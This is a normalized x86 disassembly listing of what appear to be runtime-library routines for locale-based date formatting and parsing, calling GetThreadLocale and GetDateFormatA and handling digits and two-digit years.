lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409ac4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409978
pop esi
pop ecx
pop ebp
retn 0x8
sub_409ae4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409764
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409b20
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_409b64
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404178
mov edx eax
mov eax ebx
call sub_409b20
pop ecx
pop ebx
pop ebp
retn
sub_409b84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408b50
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409b20
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409bd0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409bfc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409ac4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409c34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409818
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409c74
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409dc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eb8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409dc9
lea eax [ ebp - 0x118 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404128
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404178
mov edx eax
mov eax [ ebx ]
call sub_40c1f4
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c368
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4043d8
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c304
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040b0
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c368
mov ecx eax
mov eax ebx
mov edx esi
call sub_403fa8
sub_409ddc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409eba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eb8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409ec1
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404128
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404178
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4043d8
sub_409ee4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a665
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a66c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403edc
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c3e8
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c3c8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409b20
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c3e8
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409b20
pop ecx
mov al [ eax + lookup_table_409fc7 ]
jmp [ eax * 4 + jump_table_40a000 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409bfc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409c74
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409b64
pop ecx
jmp r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409ddc
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409b64
pop ecx
jmp r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409bd0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409c34
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409c34
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409c34
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409bd0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409bd0
pop ecx
push ebp
call sub_409c34
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409c34
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
push ebp
call sub_409bd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
push ebp
call sub_409c34
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409b84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409b84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409b20
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409b20
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409b20
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ae4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409b20
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409b20
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ae4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c3e8
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409b20
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409b84
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ae4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b64
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b64
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c3e8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ee4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409b20
pop ecx
jmp r-xdata
push ebp
call sub_409bfc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ae4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b64
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4089ac
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4089ac
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4089ac
test eax eax
jne r-xdata
jmp r-xdata
sub_40a698
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409ee4
pop ecx
push ebp
mov eax ebx
call sub_409ee4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403fa8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a708
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404178
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a72c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a708
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404178
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a7c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a839
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a840
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a708
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404178
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407f38
test eax eax
jne r-xdata
mov eax edi
call sub_404178
add [ esi ] eax
mov bl 0x1
sub_40a84c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a708
mov eax esi
call sub_404178
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a884
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404178
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a8d0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404178
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c42c
mov [ ebx ] eax
jmp r-xdata
sub_40a918
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404378
push eax
mov eax [ ebx ]
call sub_404378
pop edx
call sub_40c5a4
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a96c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409b0c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a9c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ace3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a884
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c4e0
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a72c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a8d0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4043d8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407fa8
mov eax [ ebp - 0x1c ]
call sub_40a918
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40acea
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403edc
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a84c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a72c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a84c
test al al
je r-xdata
call sub_409b0c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a72c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4098b0
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044bc
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a84c
mov edx ebx
mov eax esi
call sub_40a708
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404178
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a8d0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a96c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a708
mov eax esi
call sub_404178
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
